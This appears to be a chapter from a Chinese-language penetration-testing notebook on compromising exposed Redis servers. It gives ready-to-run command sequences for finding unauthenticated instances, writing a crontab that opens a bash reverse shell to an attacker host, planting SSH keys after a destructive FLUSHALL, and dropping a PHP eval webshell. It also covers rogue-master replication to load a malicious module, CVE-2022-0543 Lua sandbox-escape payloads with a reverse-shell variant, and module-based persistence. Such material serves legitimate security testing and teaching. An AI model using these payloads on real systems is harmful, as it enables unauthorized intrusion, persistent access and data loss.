# 06-Redis渗透

> Redis 默认无密码 + 默认监听 0.0.0.0，是外网暴露率最高的数据库服务。前置见 [[01-数据库渗透流程与探测|01章]]。

## 目录
- [[#一、未授权访问检测|一、未授权访问检测]]
- [[#二、写crontab反弹shell|二、写crontab反弹shell]]
- [[#三、写SSH公钥|三、写SSH公钥]]
- [[#四、写webshell|四、写webshell]]
- [[#五、主从复制RCE|五、主从复制RCE]]
- [[#六、沙箱逃逸CVE-2022-0543|六、沙箱逃逸CVE-2022-0543]]
- [[#七、RDB文件加载恶意模块|七、RDB文件加载恶意模块]]
- [[#八、版本可用性对照表|八、版本可用性对照表]]

---

## 一、未授权访问检测

```bash
# 直连测试（无密码时直接进入提示符）
redis-cli -h <target>

# 检测命令
<target>:6379> INFO server          # 版本、OS 信息
<target>:6379> CONFIG GET dir       # 当前工作目录
<target>:6379> CONFIG GET requirepass   # 空即无认证
<target>:6379> KEYS *               # 列出所有键（生产慎用，量大阻塞）
<target>:6379> SELECT 0             # 切换数据库

# 有密码时的认证方式
redis-cli -h <target> -a <password>
```

nmap 批量检测：

```bash
nmap -p 6379 --script redis-info <target>
```

网段批量未授权排查脚本（授权内网使用）：

```bash
#!/bin/bash
for ip in $(seq 1 254); do
    (timeout 2 redis-cli -h 192.168.1.$ip INFO server 2>/dev/null | \
     grep -q 'redis_version' && echo "UNAUTH: 192.168.1.$ip") &
done
wait
```

关键信息字段解读：

| INFO 字段 | 红队用途 |
|-----------|---------|
| `redis_version` | 决定可用利用链（对照第八节） |
| `os:Linux ... x86_64` / `alpine` | 判断是否容器环境（容器常无 cron） |
| `dir` | 当前落盘目录，判断写文件起点 |
| `run_id`、`role` | 是否为主从集群成员，可借复制关系扩大战果 |

---

## 二、写crontab反弹shell

**原理：** `CONFIG SET dir/dbfilename` 把 RDB 落盘位置改到 cron 目录，`SAVE` 触发写入，cron 加载后执行反弹命令。

**完整命令序列：**

```bash
redis-cli -h <target>
```

```text
CONFIG SET dir /var/spool/cron/crontabs     # Ubuntu/Debian；CentOS 为 /var/spool/cron/
CONFIG SET dbfilename root                  # crontab 文件名 = 用户名
SET payload "\n\n*/1 * * * * bash -i >& /dev/tcp/<攻击IP>/4444 0>&1\n\n"
SAVE
```

```bash
# 攻击机先起监听
nc -lvnp 4444
```

**适用条件与限制：**

| 条件 | 说明 |
|------|------|
| Redis 以 root 运行 | 低权限用户无法写 /var/spool/cron |
| cron 目录可写 | 部分系统目录权限收紧后失败 |
| crond 服务运行 | 容器环境常没有 crontab |
| RDB 格式容忍 | 写入内容含垃圾头，cron 忽略解析失败的行 |

> Debian 对 crontab 文件权限校验严格（需 600 且属主正确），CentOS 成功率更高。失败就换第三节 SSH 公钥。

---

## 三、写SSH公钥

**条件：** Redis 运行账户有 `.ssh` 目录写权限，且 sshd 允许公钥登录。

```bash
# 攻击机生成密钥对
ssh-keygen -t rsa -f id_rsa -N '' -C 'pwn'

# 写入 authorized_keys（flushall 清空旧数据避免干扰）
redis-cli -h <target> FLUSHALL    # 授权环境使用，破坏性操作！
```

```text
# redis-cli 内：
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET pubkey "\n\nssh-rsa AAAA...(id_rsa.pub内容)... pwn\n\n"
SAVE
```

```bash
# 连接验证
ssh -i id_rsa root@<target>
```

若 `/root/.ssh` 不存在且无法创建则失败；可先用第二节确认权限再操作。

---

## 四、写webshell

知道 Web 绝对路径且可写时：

```text
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET shell "<?php eval($_REQUEST[cmd]);?>"
SAVE
```

落盘文件带 RDB 二进制头，PHP 只执行 `<?php ?>` 内代码，其余为输出噪音，通常可用。配合路径猜测方法参见 [[02-MySQL渗透|02-MySQL渗透]] 第五节。

---

## 五、主从复制RCE

**原理（rogue server）：** Redis 主从复制会把主库的 RDB 同步给从库。攻击者伪造一个恶意主库，把 **恶意 .so 模块**伪装成 RDB 数据推送给目标；目标以模块形式加载后获得命令执行。这是绕过 `dir` 不可写限制的通用方案。

```bash
# 使用 redis-rogue-server 一键化利用
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server && python3 -m pip install -r requirements.txt
python3 redis-rogue-server.py --rhost <target> --lhost <攻击IP> \
    --exp module.so --verbose
# 交互式 shell 或直接执行命令
python3 redis-rogue-server.py --rhost <target> --lhost <攻击IP> \
    --exp module.so --cmd 'id'
```

手工流程（理解原理用）：

```text
SLAVEOF <攻击IP> 6379            # 目标成为攻击者伪主库的从库
CONFIG SET dir /tmp/             # 选一个可写目录
CONFIG SET dbfilename evil.so    # 同步下来的 so
MODULE LOAD /tmp/evil.so         # 加载恶意模块 → 注册 system.exec 函数
SYSTEM.EXEC "id"
```

适用版本：Redis 4.x 引入 MODULE LOAD 后至 5.x 可稳定利用；部分 6.x 发行版已移除或限制模块加载能力（见第八节）。

---

## 六、沙箱逃逸CVE-2022-0543

Debian/Ubuntu 打包版 Redis 存在 Lua 沙箱实现缺陷：`package` 变量未彻底隔离，可借其加载 `luaopen_*` 库逃出沙箱直接 FFI 调用 libc。

```bash
# 完整 payload（eval 执行 Lua）
redis-cli -h <target> eval 'local f=loadstring or load; local x=f("local ffi=require(\"ffi\");ffi.cdef(\"int system(const char *\);");return ffi.C.system("id > /tmp/pwned")' 0

# 反弹 shell 变体
redis-cli -h <target> eval 'local l=loadstring or load; local s=l("local ffi=require(\"ffi\");ffi.cdef(\"int system(const char *\);");return ffi.C.system("/bin/bash -c \"bash -i >& /dev/tcp/<攻击IP>/4444 0>&1\"")' 0
```

影响范围：Debian 及衍生发行版打包的 Redis 3.2~6.x（上游源码编译版不受影响）。无需任何文件写入条件，命中即 RCE，优先级高于第五节。

---

## 七、RDB文件加载恶意模块

补充一笔持久化思路：拿到主机权限后，向 `dbfilename` 配置的路径放置含模块加载指令的 RDB，或在 `redis.conf` 中预置 `loadmodule` 行，重启后自动加载恶意 so 维持权限。属于后渗透阶段手段，见 [[09-工具链速查|09章]] 的组合建议。

---

## 八、版本可用性对照表

| 版本 | 写crontab/SSH | 主从复制RCE | CVE-2022-0543 | 备注 |
|------|:---:|:---:|:---:|------|
| 2.x-3.x | 可用 | 无模块机制不可用 | Debian系可用 | 最常见的老版本 |
| 4.x | 可用 | 可用 | Debian系可用 | MODULE LOAD 引入 |
| 5.x | 可用 | 可用 | Debian系可用 | 利用成功率最高 |
| 6.x | 受限（保护模式默认开） | 部分发行版禁用模块 | Debian系可用 | CONFIG SET 可能被 rename |
| 7.x+ | 保护模式+ACL 收紧 | 多数禁用 | 已修复 | 需依赖弱口令 |

> 即使高版本，`rename-command` 未覆盖 `CONFIG` 时上述手法依然成立——先 `CONFIG GET *` 摸清配置再动手。

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
